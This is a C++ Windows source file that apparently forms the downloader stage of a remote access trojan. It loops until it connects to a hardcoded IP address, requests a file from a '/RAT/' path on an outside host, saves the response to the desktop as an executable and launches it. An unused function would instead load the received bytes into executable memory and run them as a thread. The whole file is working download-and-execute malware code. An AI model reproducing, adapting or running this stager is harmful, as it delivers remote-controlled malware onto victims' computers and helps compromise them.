//cl /EHsc .\download_to_memory.cpp /link ws2_32.lib user32.lib kernel32.lib /OUT:download_to_memory.exe
#include <ws2tcpip.h>
#include <winsock2.h>
#include <windows.h>
#include <iostream>
#include <string>
#include <mutex>
#include <sstream>
#include <vector>
#include <algorithm>
#include <psapi.h>
#include <fstream>

using namespace std;
#pragma comment(lib, "ws2_32.lib")

SOCKET sock;
std::mutex socketMutex;

void safe_closesocket(SOCKET &clientSocket);
bool socket_setup(SOCKET &clientSocket);
void send_data(SOCKET &clientSocket, const string &filename ,const string &data);
vector<unsigned char> receive_data(SOCKET &clientSocket, const string &filename);
void executeFromMemory(const std::vector<unsigned char>& executableData);

int main()
{

    vector<unsigned char> data;

    // data = receive_data(sock, "cmd.exe");
    // if (!data.empty())
    // {
    //     string receivedText(data.begin(), data.end());
    //     cout << "Received Data (Text):";
    //     cout << receivedText << endl;
    // }
    // else
    // {
    //     cerr << "No data received or an error occurred." << endl;
    // }

    data = receive_data(sock, "cmd.exe");
    std::string tempPath = "C:\\Users\\Arth\\Desktop\\downloaded_file.exe";
    std::ofstream outFile(tempPath, std::ios::binary);

    if (!data.empty()) {
        outFile.write(reinterpret_cast<const char*>(data.data()), data.size());
        outFile.close();
        std::cout << "Downloaded file saved as 'downloaded_file.exe'.\n";
    } else {
        std::cerr << "No data received or an error occurred. File not saved.\n";
    }
    if (!data.empty())
    {
        // cout << "Received Data (Raw Hex): ";
        // for (unsigned char byte : data)
        // {
        //     cout << hex << (int)byte << " "; // Print each byte as hex
        // }
        // cout << endl;
    }
    else
    {
        cerr << "No data received or an error occurred." << endl;
    }

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    if (CreateProcessA(tempPath.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        std::cerr << "CreateProcess failed. Error: " << GetLastError() << std::endl;
    }
    //executeFromMemory(data);

    return 0;
}

void executeFromMemory(const std::vector<unsigned char>& executableData)
{

    LPVOID execMemory = VirtualAlloc(nullptr, executableData.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (!execMemory)
    {
        cerr << "VirtualAlloc failed with error: " << GetLastError() << endl;
        return;
    }

    // Copy the executable data into the allocated memory
    memcpy(execMemory, executableData.data(), executableData.size());
    cout << "Executable data copied to memory." << endl;

    // Create a new thread to execute the code from memory
    DWORD threadId;
    HANDLE hThread = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)execMemory, nullptr, 0, &threadId);
    if (hThread == nullptr)
    {
        std::cerr << "Thread creation failed!" << GetLastError() << endl;

        
        VirtualFree(execMemory, 0, MEM_RELEASE);
        return;
    }else cout << "Thread created." << endl;


    WaitForSingleObject(hThread, INFINITE);
    cout << "Thread finished." << endl;
    // Free the allocated memory after use
    VirtualFree(execMemory, 0, MEM_RELEASE);
}


bool socket_setup(SOCKET &clientSocket)
{
    bool connected = false;

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        std::cerr << "WSAStartup failed.\n";
        return false;
    }

    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientSocket == INVALID_SOCKET)
    {
        std::cerr << "socket failed.\n";
        WSACleanup();
        return false;
    }

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(80);
    serverAddr.sin_addr.s_addr = inet_addr("103.92.235.21");

    connected = false;
    while (!connected)
    {
        if (connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
        {
            int error = WSAGetLastError();
            if (error != WSAECONNREFUSED)
            {
                std::stringstream ss;
                ss << "Connection failed with error: " << error << " (" << gai_strerror(error) << "). Retrying in 2 seconds...\n";
                std::cerr << ss.str();
            }   
            else std::cerr << "Connection refused. Retrying in 2 seconds...\n";
            Sleep(2000);
        }
        else
        {
            //std::cout << "Connected to the server!\n";
            connected = true;
        }
    }
    return true;
}

void safe_closesocket(SOCKET &clientSocket)
{
    if (clientSocket != INVALID_SOCKET)
    {
        shutdown(clientSocket, SD_BOTH);
        closesocket(clientSocket);
        
        clientSocket = INVALID_SOCKET;
    }
}

vector<unsigned char> receive_data(SOCKET &clientSocket, const string &filename)
{
    lock_guard<mutex> lock1(socketMutex);

    socket_setup(clientSocket);

    // Send HTTP GET request
    string httpRequest = "GET /RAT/" + filename + " HTTP/1.1\r\n";
    httpRequest += "Host: arth.imbeddex.com\r\n";
    httpRequest += "Connection: close\r\n\r\n";

    int bytesSent = send(clientSocket, httpRequest.c_str(), httpRequest.length(), 0);
    if (bytesSent == SOCKET_ERROR)
    {
        int error = WSAGetLastError();
        cerr << "Send failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
        throw std::runtime_error("Send failed");
    }

    // Receive data in chunks
    char buffer[8192]; // Increased buffer size
    vector<unsigned char> receivedData;
    int bytesReceived;

    do {
        bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);
        if (bytesReceived > 0) {
            receivedData.insert(receivedData.end(), buffer, buffer + bytesReceived);
        } else if (bytesReceived == 0) {
            cerr << "Connection closed by server." << endl;
            break;
        } else {
            int error = WSAGetLastError();
            cerr << "Receive failed with error: " << error << endl;
            break;
        }
    } while (bytesReceived > 0);

    // Ensure header separator is found
    size_t headerEnd = 0;
    const unsigned char CRLF[] = {0x0D, 0x0A, 0x0D, 0x0A};

    // Search for header separator (CRLF + CRLF)
    for (size_t i = 0; i < receivedData.size() - 3; ++i)
    {
        if (receivedData[i] == CRLF[0] &&
            receivedData[i + 1] == CRLF[1] &&
            receivedData[i + 2] == CRLF[2] &&
            receivedData[i + 3] == CRLF[3])
        {
            headerEnd = i + 4; // Found header, skip the separator
            break;
        }
    }

    if (headerEnd != 0)
    {
        //cout << "Header found at position: " << headerEnd << endl;
    }
    else
    {
        cerr << "Header separator not found." << endl;
        throw std::runtime_error("Header separator not found");
    }

    // Make sure headerEnd + 4 is within the bounds of the receivedData
    if (headerEnd < receivedData.size())
    {
        // Extract body after header (start from headerEnd)
        vector<unsigned char> body(receivedData.begin() + headerEnd, receivedData.end());
        safe_closesocket(clientSocket); // Close the socket safely

        return body; // Return the extracted body
    }
    else
    {
        cerr << "Body extraction failed: headerEnd exceeds receivedData size." << endl;
        safe_closesocket(clientSocket); // Close the socket safely
        throw std::runtime_error("Body extraction failed");
    }
}